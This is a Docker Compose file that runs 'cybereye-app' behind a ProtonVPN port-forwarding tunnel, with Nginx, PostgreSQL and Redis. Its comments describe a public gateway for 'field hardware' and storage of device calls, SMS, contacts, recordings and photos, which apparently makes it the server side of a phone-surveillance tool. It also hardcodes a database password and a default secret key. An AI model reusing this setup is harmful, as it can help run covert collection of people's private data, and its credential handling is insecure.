services:
  # 1. ProtonVPN Client with NAT-PMP Port Forwarding (Gluetun)
  proton-vpn:
    image: qmcgaw/gluetun:latest
    container_name: proton-vpn
    hostname: proton-vpn
    restart: unless-stopped
    cap_add:
      - NET_ADMIN
    devices:
      - /dev/net/tun:/dev/net/tun
    ports:
      # Web Dashboard: Bound strictly to localhost for admin security
      - "${WEB_BIND:-127.0.0.1}:${WEB_PORT:-8800}:8800"
      # famX Hardware Gateway: Publicly open to field hardware
      - "${DEVICE_BIND:-0.0.0.0}:${DEVICE_PORT:-5000}:5000"
    environment:
      VPN_SERVICE_PROVIDER: protonvpn
      VPN_TYPE: openvpn
      OPENVPN_USER: ${PROTON_OPENVPN_USER}
      OPENVPN_PASSWORD: ${PROTON_OPENVPN_PASSWORD}
      OPENVPN_PROTOCOL: udp
      PORT_FORWARD_ONLY: "on"
      VPN_PORT_FORWARDING: "on"
      VPN_PORT_FORWARDING_PORTS_COUNT: "1"
      VPN_PORT_FORWARDING_LISTENING_PORTS: "5000"
      VPN_PORT_FORWARDING_STATUS_FILE: "/gluetun/forwarded_port"
      SERVER_COUNTRIES: ${SERVER_COUNTRIES:-India}
      SERVER_CITIES: ${SERVER_CITIES:-Mumbai}
      SERVER_NAMES: ${SERVER_NAMES:-}
      TZ: Asia/Kolkata
    volumes:
      - ./gluetun:/gluetun
    networks:
      - proton-net

  # 2. Nginx Load Balancer & Reverse Proxy
  nginx:
    image: nginx:alpine
    container_name: proton-nginx
    restart: unless-stopped
    network_mode: "service:proton-vpn"
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro
    depends_on:
      proton-vpn:
        condition: service_started
      cybereye-app:
        condition: service_started

  # 3. Dual-Port Application & famX Hardware Gateway
  cybereye-app:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: cybereye-app
    restart: unless-stopped
    network_mode: "service:proton-vpn"
    depends_on:
      proton-vpn:
        condition: service_started
      postgres:
        condition: service_healthy
      redis:
        condition: service_healthy
    environment:
      PYTHONUNBUFFERED: "1"
      WEB_PORT: "8801"
      DEVICE_PORT: "5001"
      HOST: "127.0.0.1"
      DATABASE_URL: "postgresql://proton_admin:proton_secure_pass@postgres:5432/proton_db"
      REDIS_URL: "redis://redis:6379/0"
      SECRET_KEY: "${SECRET_KEY:-cybereye-secret}"
      GEMINI_API_KEY: "${GEMINI_API_KEY:-}"
      TELEGRAM_BOT_TOKEN: "${TELEGRAM_BOT_TOKEN:-}"
      TELEGRAM_CHAT_ID: "${TELEGRAM_CHAT_ID:-}"
      IP_PORT_CHECK_INTERVAL: "${IP_PORT_CHECK_INTERVAL:-30}"
      FORWARDED_PORT_FILE: "/gluetun/forwarded_port"
    volumes:
      # Persistent backup JSON
      - ./users_db.json:/app/users_db.json
      # Device logs, calls, sms, contacts
      - ./data:/app/data
      # Uploaded media, recordings, photos
      - ./media:/app/media
      # Gluetun port status file mount
      - ./gluetun:/gluetun:ro

  # 4. PostgreSQL 15 Enterprise Database
  postgres:
    image: postgres:15-alpine
    container_name: proton-postgres
    restart: unless-stopped
    environment:
      POSTGRES_DB: proton_db
      POSTGRES_USER: proton_admin
      POSTGRES_PASSWORD: proton_secure_pass
    volumes:
      - postgres-data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U proton_admin -d proton_db"]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
      - proton-net

  # 5. Redis 7 High-Speed In-Memory Cache
  redis:
    image: redis:7-alpine
    container_name: proton-redis
    restart: unless-stopped
    command: redis-server --appendonly yes
    volumes:
      - redis-data:/data
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 10s
      timeout: 5s
      retries: 5
    networks:
      - proton-net

networks:
  proton-net:
    name: proton_proton-net
    driver: bridge

volumes:
  postgres-data:
  redis-data:
